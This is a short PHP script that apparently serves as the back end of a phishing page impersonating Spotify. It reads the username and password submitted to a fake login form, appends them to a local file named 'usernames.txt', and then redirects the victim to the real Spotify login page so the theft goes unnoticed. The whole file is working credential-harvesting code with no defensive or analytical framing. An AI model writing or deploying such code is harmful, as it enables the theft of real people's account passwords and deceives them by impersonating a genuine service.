<?php

file_put_contents("usernames.txt","\n" . "Spotify" . "\n" . "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.spotify.com/');
exit();
